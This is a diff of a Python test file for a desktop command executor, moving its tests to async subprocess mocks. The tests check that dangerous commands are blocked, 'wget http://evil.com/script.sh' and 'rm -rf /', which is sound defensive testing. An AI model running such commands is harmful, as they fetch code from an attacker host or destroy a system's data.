@@ -1,7 +1,8 @@
 """Tests para src/command_executor.py"""
 
+import asyncio
 import subprocess
-from unittest.mock import patch, MagicMock
+from unittest.mock import patch, MagicMock, AsyncMock
 
 import pytest
 
@@ -40,62 +41,78 @@ def test_is_safe_command_blocked(executor):
     assert executor._is_safe_command("wget http://evil.com/script.sh") is False
 
 
-def test_execute_success(executor):
-    with patch('subprocess.run') as mock_run:
-        mock_run.return_value = MagicMock(
-            returncode=0,
-            stdout="Spotify launched\n",
-            stderr="",
-        )
-        success, output = executor.execute("omarchy launch spotify", "Launch Spotify")
+@pytest.mark.asyncio
+async def test_execute_success(executor):
+    with patch('asyncio.create_subprocess_exec') as mock_exec:
+        mock_proc = AsyncMock()
+        mock_proc.returncode = 0
+        mock_proc.communicate.return_value = (b"Spotify launched\n", b"")
+        mock_exec.return_value = mock_proc
+        
+        success, output = await executor.execute("omarchy launch spotify", "Launch Spotify")
 
     assert success is True
     assert "Spotify launched" in output
 
 
-def test_execute_failure(executor):
-    with patch('subprocess.run') as mock_run:
-        mock_run.return_value = MagicMock(
-            returncode=1,
-            stdout="",
-            stderr="Application not found",
-        )
-        success, output = executor.execute("omarchy launch nonexistent", "Launch app")
+@pytest.mark.asyncio
+async def test_execute_failure(executor):
+    with patch('asyncio.create_subprocess_exec') as mock_exec:
+        mock_proc = AsyncMock()
+        mock_proc.returncode = 1
+        mock_proc.communicate.return_value = (b"", b"Application not found")
+        mock_exec.return_value = mock_proc
+        
+        success, output = await executor.execute("omarchy launch nonexistent", "Launch app")
 
     assert success is False
     assert "not found" in output.lower() or "Application" in output
 
 
-def test_execute_blocked_command(executor):
-    success, output = executor.execute("rm -rf /", "Delete everything")
+@pytest.mark.asyncio
+async def test_execute_blocked_command(executor):
+    success, output = await executor.execute("rm -rf /", "Delete everything")
 
     assert success is False
     assert "no permitido" in output.lower()
 
 
-def test_execute_timeout(executor):
-    with patch('subprocess.run', side_effect=subprocess.TimeoutExpired("cmd", 30)):
-        success, output = executor.execute("omarchy launch slow-app", "Launch slow app")
+@pytest.mark.asyncio
+async def test_execute_timeout(executor):
+    with patch('asyncio.wait_for', side_effect=asyncio.TimeoutError()):
+        with patch('asyncio.create_subprocess_exec') as mock_exec:
+            mock_proc = AsyncMock()
+            mock_proc.kill = MagicMock()
+            mock_proc.communicate.return_value = (b"", b"")
+            mock_exec.return_value = mock_proc
+            
+            success, output = await executor.execute("omarchy launch slow-app", "Launch slow app")
 
     assert success is False
     assert "Timeout" in output
 
 
-def test_execute_dry_run(dry_executor):
-    success, output = dry_executor.execute("omarchy launch spotify", "Launch Spotify")
+@pytest.mark.asyncio
+async def test_execute_dry_run(dry_executor):
+    success, output = await dry_executor.execute("omarchy launch spotify", "Launch Spotify")
 
     assert success is True
     assert "DRY RUN" in output
 
 
-def test_execute_multiple(executor):
-    with patch('subprocess.run') as mock_run:
-        mock_run.return_value = MagicMock(returncode=0, stdout="OK", stderr="")
+@pytest.mark.asyncio
+async def test_execute_multiple(executor):
+    with patch('asyncio.create_subprocess_exec') as mock_exec:
+        mock_proc = AsyncMock()
+        mock_proc.returncode = 0
+        mock_proc.communicate.return_value = (b"OK", b"")
+        mock_exec.return_value = mock_proc
+        
         commands = [
             SystemCommand(command="playerctl play-pause", description="Toggle music"),
             SystemCommand(command="wpctl set-volume @DEFAULT_AUDIO_SINK@ 70%", description="Set volume"),
         ]
-        results = executor.execute_multiple(commands)
+        results = await executor.execute_multiple(commands)
 
     assert len(results) == 2
     assert all(success for success, _ in results)
